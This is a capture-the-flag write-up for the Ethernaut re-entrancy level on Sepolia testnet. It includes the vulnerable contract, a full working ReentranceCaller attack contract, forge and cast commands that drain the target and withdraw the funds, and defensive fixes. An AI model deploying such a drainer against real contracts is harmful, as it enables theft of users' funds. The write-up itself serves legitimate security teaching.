# 10 - Re-entrancy

## Overview

- **Difficulty:** 6/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x39fd8a00708ff6b6fc48e1c4971aeb46a2a00220`](https://sepolia.etherscan.io/address/0x39fd8a00708ff6b6fc48e1c4971aeb46a2a00220)
- **Attack Contract (`ReentranceCaller`):** [`0x7ca04e5849dc255c73c72989773adb3f54fe6705`](https://sepolia.etherscan.io/address/0x7ca04e5849dc255c73c72989773adb3f54fe6705)
- **Transactions:**
  - **1. Deploy & Initial Deposit (0.01 ETH):** [`0x53ca11b5299b4812c2678217f74d19329e3f8a425a168a9d0cee4dc2d520ca70`](https://sepolia.etherscan.io/tx/0x53ca11b5299b4812c2678217f74d19329e3f8a425a168a9d0cee4dc2d520ca70)
  - **2. Re-entrancy Attack (`attack()`):** [`0x1f1ac327b4359334a83d9ddd7ee63cfbbe372ac750e1ede79267f756777bcae2`](https://sepolia.etherscan.io/tx/0x1f1ac327b4359334a83d9ddd7ee63cfbbe372ac750e1ede79267f756777bcae2)
  - **3. Level Submission:** [`0x97a1f08e25bc0e56e700fbe10e7e206db913a2a43af7b67eeadf14d0abd76b51`](https://sepolia.etherscan.io/tx/0x97a1f08e25bc0e56e700fbe10e7e206db913a2a43af7b67eeadf14d0abd76b51)

---

## Objective

Drain all the funds from the `Reentrance` contract instance.

---

## Contract Analysis

The target contract is [`src/10-re-entrancy/Reentrance.sol`](./Reentrance.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {SafeMath} from "../helpers/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

---

### Vulnerability Breakdown: Checks-Effects-Interactions Violation

The flaw lives inside the `withdraw` function:

```solidity
function withdraw(uint256 _amount) public {
    // 1. CHECK
    if (balances[msg.sender] >= _amount) {
        // 2. INTERACTION (External Call before state update)
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        // 3. EFFECT (State update performed AFTER external call)
        balances[msg.sender] -= _amount;
    }
}
```

1. **Stale State on Callbacks:**
   The contract sends Ether to `msg.sender` via a low-level `.call{value: _amount}("")` **before** it updates `balances[msg.sender]`.
2. **Re-entrant Execution:**
   When Ether is sent to an external smart contract, that contract's `receive()` function executes immediately. If the receiving contract invokes `withdraw()` again inside `receive()`, the `balances[msg.sender]` has **not yet been deducted**.
3. **Repeated Extraction:**
   The `if (balances[msg.sender] >= _amount)` check passes again on the original, un-deducted balance, sending another tranche of Ether. This cycle repeats recursively until the target contract is drained completely.

```text
[ ReentranceCaller ]                           [ Reentrance Contract ]
         │                                                │
         │──── 1. withdraw(0.01 ETH) ────────────────────▶│ (Balance: 0.011 ETH)
         │                                                │ Checks: balance >= 0.01 ETH (OK)
         │◀─── 2. send 0.01 ETH (triggers receive()) ─────│ (Balance: 0.001 ETH)
         │                                                │ State NOT yet updated!
  [ receive() ]                                           │
         │──── 3. re-enter: withdraw(0.001 ETH) ─────────▶│
         │                                                │ Checks: balance >= 0.001 ETH (OK!)
         │◀─── 4. send 0.001 ETH (triggers receive()) ────│ (Balance: 0 ETH - DRAINED!)
  [ receive() ]                                           │
         │──── 5. amountToWithdraw == 0 (loop ends)       │
         │                                                │ Unwinds stack & updates state
```

---

### EVM Deep Dive: Why Not Call `withdraw()` Inside the Constructor?

During contract creation:
- The EVM executes the **creation code** (the `constructor`).
- The contract's **runtime bytecode has not yet been deployed or saved to the blockchain** (`extcodesize == 0`).
- If `withdraw()` is called from inside `constructor`, `Reentrance` sends ETH back to `ReentranceCaller`. However, because runtime bytecode does not exist yet, the EVM handles the transfer like a simple EOA transfer—**`receive()` is never triggered**.
- Therefore, re-entrancy exploits must deploy first, then trigger the callback loop through an external function call (`attack()`).

---

## Attack Contract

The exploit is implemented in [`src/10-re-entrancy/ReentranceCaller.sol`](./ReentranceCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceCaller {
    address public immutable owner;
    IReentrance private immutable i_reentrance;
    uint256 private constant DEPOSIT_AMOUNT = 0.01 ether;

    constructor(address payable _reentrance) payable {
        owner = msg.sender;
        i_reentrance = IReentrance(_reentrance);

        // Deposit initial ETH into Reentrance
        i_reentrance.donate{value: DEPOSIT_AMOUNT}(address(this));
    }

    function attack() external {
        i_reentrance.withdraw(DEPOSIT_AMOUNT);
    }

    function min(uint256 _x, uint256 _y) private pure returns (uint256) {
        return _x <= _y ? _x : _y;
    }

    receive() external payable {
        uint256 targetBalance = address(i_reentrance).balance;

        if (targetBalance > 0) {
            uint256 amountToWithdraw = min(DEPOSIT_AMOUNT, targetBalance);
            i_reentrance.withdraw(amountToWithdraw);
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}
```

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy & Initial Deposit

Deploy `ReentranceCaller` with `--value 0.01ether`, supplying the `Reentrance` instance address. The constructor immediately donates the 0.01 ETH to establish a credit balance:

```bash
forge create src/10-re-entrancy/ReentranceCaller.sol:ReentranceCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --value 0.01ether \
  --broadcast \
  --constructor-args 0x39fd8a00708ff6b6fc48e1c4971aeb46a2a00220
```

- **Deploy & Deposit Tx:** [`0x53ca11b5299b4812c2678217f74d19329e3f8a425a168a9d0cee4dc2d520ca70`](https://sepolia.etherscan.io/tx/0x53ca11b5299b4812c2678217f74d19329e3f8a425a168a9d0cee4dc2d520ca70)
- **Deployed Contract Address:** [`0x7ca04e5849dc255c73c72989773adb3f54fe6705`](https://sepolia.etherscan.io/address/0x7ca04e5849dc255c73c72989773adb3f54fe6705)

### 2. Trigger the Re-entrancy Attack

Call `attack()` to initiate the first withdrawal and spark the recursive `receive()` loop:

```bash
cast send 0x7ca04e5849dc255c73c72989773adb3f54fe6705 "attack()" \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Attack Tx:** [`0x1f1ac327b4359334a83d9ddd7ee63cfbbe372ac750e1ede79267f756777bcae2`](https://sepolia.etherscan.io/tx/0x1f1ac327b4359334a83d9ddd7ee63cfbbe372ac750e1ede79267f756777bcae2)

### 3. Verify Target Balance

Check that `Reentrance` is completely drained:

```bash
cast balance 0x39fd8a00708ff6b6fc48e1c4971aeb46a2a00220 --rpc-url sepolia
# Output: 0
```

### 4. (Optional) Withdraw Loot

Transfer the drained funds safely back to your wallet:

```bash
cast send 0x7ca04e5849dc255c73c72989773adb3f54fe6705 "withdrawFunds()" \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

### 5. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0x97a1f08e25bc0e56e700fbe10e7e206db913a2a43af7b67eeadf14d0abd76b51`](https://sepolia.etherscan.io/tx/0x97a1f08e25bc0e56e700fbe10e7e206db913a2a43af7b67eeadf14d0abd76b51)

---

## Key Security Takeaways

1. **Follow the Checks-Effects-Interactions (CEI) Pattern:**
   Always perform state modifications (effects) **before** making external calls (interactions):
   ```solidity
   // SECURE: CEI Pattern
   function withdraw(uint256 _amount) public {
       require(balances[msg.sender] >= _amount, "Insufficient balance"); // 1. Check
       balances[msg.sender] -= _amount;                                  // 2. Effect
       (bool success, ) = msg.sender.call{value: _amount}("");           // 3. Interaction
       require(success, "Transfer failed");
   }
   ```
2. **Use OpenZeppelin's `ReentrancyGuard`:**
   Apply the `nonReentrant` modifier to functions that transfer ETH or call external addresses:
   ```solidity
   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

   function withdraw(uint256 _amount) public nonReentrant {
       // ...
   }
   ```
3. **Be Aware of Cross-Function & Read-Only Reentrancy:**
   Re-entrancy isn't limited to re-entering the same function. If Contract A updates balance in function `withdraw()`, but has another function `transfer()` sharing the same balance state, an attacker can re-enter into `transfer()`. In DeFi, read-only reentrancy can corrupt price oracles by reading intermediate state before accounting balances are synchronized.
